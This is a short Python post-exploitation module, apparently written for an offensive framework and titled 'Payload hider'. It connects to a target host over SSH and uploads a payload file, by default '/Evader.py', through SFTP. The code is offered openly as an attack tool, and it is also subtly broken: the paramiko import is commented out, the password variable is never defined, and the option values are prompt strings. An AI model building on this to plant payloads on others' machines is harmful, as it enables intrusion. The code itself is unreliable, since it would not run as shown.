import pyfiglet
try:
    pass #import paramiko
except:
    pass
from collections import OrderedDict

MODULE_TYPE = "postexploit"
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'Payload hider',
            'Rank':'Good',
            'Platform':'Windows/Linux/Macos',
            'architectures':'x86/64 bit processors',
            'Description': 'File Exfiltration./ uploads payloads to ssh servers',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
            ('RHOST', ('Enter target IP )', True,'')),
            ('LPATH', ('/Evader.py', True, '')),
            ('USER', ('', True,'')),
            ('RPATH', ('', True, ''))
               
                ])
                }
    def logo(self):
    	title = 'Payload hider'
    	if pyfiglet:
    	       ascii_text = pyfiglet.figlet_format(title, font="standard")
    	       print(f"\033[91m{ascii_text}\033[0m")
    	else:
            print(title)
    def help(self):
    	print("Usage: set RHOST <ip_address>| set RPATH <path/to/destination/payload.py> | set LPATH <path/to/payload.py> | set USER <username> ,then run")
   
    def file_exfiltration(self,host, username, password, local_path, remote_path):
      ssh = paramiko.SSHClient()
      ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
      ssh.connect(host, username=username, password=password)
      sftp = ssh.open_sftp()
      sftp.put(local_path, remote_path)
      sftp.close()
      ssh.close()
    
    
    def execute(self):
        self.logo()
        host = self.info['Options']['RHOST'][0]
        username = self.info['Options']['USER'][0]
        local_path = self.info['Options']['LPATH'][0]
        remote_path = self.info['Options']['RPATH'][0]
        self.file_exfiltration(host, username, password, local_path, remote_path)
        
        return f"[+] uploading {local_path } to  {remote_path} ..."
    